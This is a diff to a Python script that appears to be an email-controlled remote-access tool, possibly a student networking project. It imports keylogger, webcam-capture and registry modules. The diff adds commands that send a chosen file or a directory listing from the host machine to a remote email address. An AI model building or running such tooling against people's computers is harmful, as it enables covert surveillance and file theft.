@@ -1,3 +1,4 @@
+from re import sub
 import ReceiveEmail
 import SendEmail
 import ListProcesses
@@ -5,6 +6,7 @@ import keylogger
 from time import time, sleep
 import WebcamCapture
 import Registry
+import ListDir
 
 client_address = "client1.computernetwork@gmail.com"
 
@@ -28,9 +30,16 @@ def Handling(subject):
     elif subject == "End Key Logging":
         content =   keylogger.EndLogging(thread)
         SendEmail.SendEmail(content,client_address,client_pass,guess_address,subject,'text')
+    elif subject[0] == "COPY FILE":
+        content = subject[1]
+        SendEmail.SendEmail(content,client_address,client_pass,guess_address,subject,'file')
+    elif subject[0] == "LIST DIR":
+        content = ListDir.listDir(subject[1])
+        SendEmail.SendEmail(content,client_address,client_pass,guess_address,subject,'text')
     elif subject[0] =="REGISTRY":
         content =  Registry.Registry(subject[1], subject[2], subject[3], subject[4], subject[5])
         SendEmail.SendEmail(content,client_address,client_pass,guess_address,subject,'text')
+    
       
 
 def main():
